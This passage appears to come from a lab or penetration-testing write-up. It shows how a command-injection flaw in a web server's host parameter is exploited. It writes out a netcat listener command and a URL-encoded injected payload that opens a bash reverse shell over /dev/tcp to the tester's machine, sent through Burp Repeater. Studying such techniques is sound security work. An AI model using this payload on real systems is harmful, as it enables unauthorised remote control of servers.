output from running webserverip;id
<img width="762" height="437" alt="image" src="https://github.com/user-attachments/assets/4f1d5361-c446-43ad-ab9d-f445ee3bde5b" />

Next im going to start a listener on my kali box to open a reverse shell. To do this I'll just start the listener on kali using `nc -lvnp 4444`. There's many different payload options, I like to use the site `https://www.revshells.com/` to use it I'll just import my kali ip, the port my listener is on, and choose which shell is running on the webserver. This is where our earlier fingerprinting comes in handy as we know the server is running debian whose default shell is bash. The payload generation is below:

<img width="1112" height="880" alt="image" src="https://github.com/user-attachments/assets/d16f8811-61ee-457c-ba92-c694723e5ab1" />

So I just have to take that generated payload, append it to our earlier test command, and we get the payload `127.0.0.1%3bbash+-c+'bash+-i+>%26+/dev/tcp/192.168.77.2/4444+0>%261'`. To get this onto the web server I am going to use Burp repeat. Note that right-clicking the `host` parameter gives the option to URL encode the payload as I type it in. Also note that bash -c along with single qoutes around the payload had to be added in order to get the server to process the request.

<img width="699" height="853" alt="image" src="https://github.com/user-attachments/assets/1a292056-02d9-4dfe-90ed-b4ae522f98b4" />
